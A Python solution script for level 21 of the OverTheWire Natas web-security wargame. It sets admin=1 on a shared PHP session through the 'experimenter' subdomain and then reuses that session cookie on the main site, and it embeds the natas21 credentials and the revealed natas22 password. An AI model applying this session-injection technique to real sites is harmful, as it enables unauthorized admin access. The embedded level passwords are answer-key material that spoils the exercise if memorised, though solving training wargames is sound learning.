from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
    
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        

url = 'http://natas21-experimenter.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas21','IFekPyrQXftziDEsUr3x21sYuahypdgJ')
my_cookies = {"PHPSESSID":'iingj5ruhsj7k4b80kh7s35m30'}
my_params = {"submit":"true","admin":"1","debug":"true"}

res, soup = make()
writeResponse('-experimenter')

url = 'http://natas21.natas.labs.overthewire.org'

res, soup = make()
writeResponse()



'''
easy as pie

Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
'''
